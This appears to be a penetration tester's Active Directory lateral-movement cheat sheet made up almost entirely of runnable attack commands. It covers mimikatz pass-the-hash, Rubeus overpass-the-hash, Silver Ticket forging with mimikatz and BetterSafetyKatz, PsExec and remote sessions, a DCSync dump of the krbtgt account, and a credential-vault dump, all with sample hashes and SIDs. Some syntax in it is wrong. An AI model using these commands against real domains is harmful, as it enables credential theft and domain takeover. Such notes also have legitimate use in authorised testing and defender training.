# Lateral Movement

## Establishing Remote Sessions on Network

Connect to a machine using Powershell Remoting:

```
$sess = New-PSSession -ComputerName test-srv
Enter-PSSession -$sess
```

Connect to a machine using Winrs:

```
winrs -r:test-srv cmd
```

## Pass The Hash

Get a session via mimikatz.exe (of any domain user).

```
mimikatz.exe
privilege::debug
sekurlsa::pth /user:domainadmin /domain:test.com /ntlm:6366243a657a4ea04e406f1abc27f1
```

## Overpass The Hash

Get a session with Domain Privileges (hash of a domain admin is required).

```
C:\AD\test\Rubeus.exe asktgt /user:domainadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Derivative Local Admin

Find derivative local admin access.

```
. C:\AD\test\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

## Silver Ticket

Execute Silver ticket attack using Mimikatz.

```
mimikatz.exe
privilege::debug
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:test.com /ptt /target:test.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:domainadmin
```

Execute Silver ticket attack using BetterSafetyKatz.

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:domainadmin /domain:test.com /sid:S-1-5-21-719815819-3726368948-3917688648 /target:test.corp.com /service:RPCSS /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

## PsExec

Execute a process remotely using PsExec.

```
PsExec64.exe cmd \\test.tech.com
```

## DCSync

Execute DCSync attack via SafetyKatz.exe.

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:test\krbtgt" "exit"
```

Execute DCSync attack via mimikatz.exe.

```
privileges::debug
lsadump::dcsync /user:test\krbtgt
```

## Credentials Vault

Dump credentials vault with SafetyKatz.exe.

```
C:\AD\Tools\SafetyKatz.exe "token::elevate" "vault::cred /patch" "exit"
```
